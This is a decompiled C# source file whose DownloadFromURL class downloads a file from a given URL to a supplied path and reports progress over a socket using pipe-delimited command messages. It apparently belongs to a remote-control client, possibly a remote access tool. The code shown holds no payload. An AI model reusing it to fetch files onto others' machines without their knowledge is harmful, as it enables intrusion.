namespace Chat
{
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Net;
    using System.Runtime.CompilerServices;

    public class DownloadFromURL
    {
        private static List<WeakReference> __ENCList = new List<WeakReference>();
        [AccessedThroughProperty("scarica")]
        private WebClient _scarica;
        private short TimeOfWait;
        private string UrlDownload;
        private Stopwatch WaiterCount;

        public DownloadFromURL(string Url)
        {
            __ENCAddToList(this);
            this.TimeOfWait = 400;
            this.WaiterCount = new Stopwatch();
            this.UrlDownload = Url;
            this.scarica = new WebClient();
        }

        [DebuggerNonUserCode]
        private static void __ENCAddToList(object value)
        {
            List<WeakReference> list = __ENCList;
            lock (list)
            {
                if (__ENCList.Count == __ENCList.Capacity)
                {
                    int index = 0;
                    int num3 = __ENCList.Count - 1;
                    for (int i = 0; i <= num3; i++)
                    {
                        WeakReference reference = __ENCList[i];
                        if (reference.IsAlive)
                        {
                            if (i != index)
                            {
                                __ENCList[index] = __ENCList[i];
                            }
                            index++;
                        }
                    }
                    __ENCList.RemoveRange(index, __ENCList.Count - index);
                    __ENCList.Capacity = __ENCList.Count;
                }
                __ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
            }
        }

        public void scarica_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            if (e.ProgressPercentage == 100)
            {
                Socketss.ListDataSend.Add(new Data("PDU|S|" + this.UrlDownload + "|S|" + Conversions.ToString(e.ProgressPercentage), null, null));
                this.WaiterCount.Stop();
                this.WaiterCount.Reset();
            }
            else if (this.WaiterCount.ElapsedMilliseconds >= this.TimeOfWait)
            {
                Socketss.ListDataSend.Add(new Data("PDU|S|" + this.UrlDownload + "|S|" + Conversions.ToString(e.ProgressPercentage), null, null));
                this.WaiterCount.Stop();
                this.WaiterCount.Reset();
                this.WaiterCount.Start();
            }
        }

        public void StartDownload(string[] info)
        {
            try
            {
                this.scarica.DownloadFileAsync(new Uri(this.UrlDownload), info[3] + info[1] + info[2]);
                this.WaiterCount.Start();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Socketss.ListDataSend.Add(new Data("Gerror|S|Error During Download URL : " + this.UrlDownload, null, null));
                ProjectData.ClearProjectError();
            }
        }

        public virtual WebClient scarica
        {
            [DebuggerNonUserCode]
            get
            {
                return this._scarica;
            }
            [MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode]
            set
            {
                DownloadProgressChangedEventHandler handler = new DownloadProgressChangedEventHandler(this.scarica_DownloadProgressChanged);
                if (this._scarica != null)
                {
                    this._scarica.DownloadProgressChanged -= handler;
                }
                this._scarica = value;
                if (this._scarica != null)
                {
                    this._scarica.DownloadProgressChanged += handler;
                }
            }
        }
    }
}

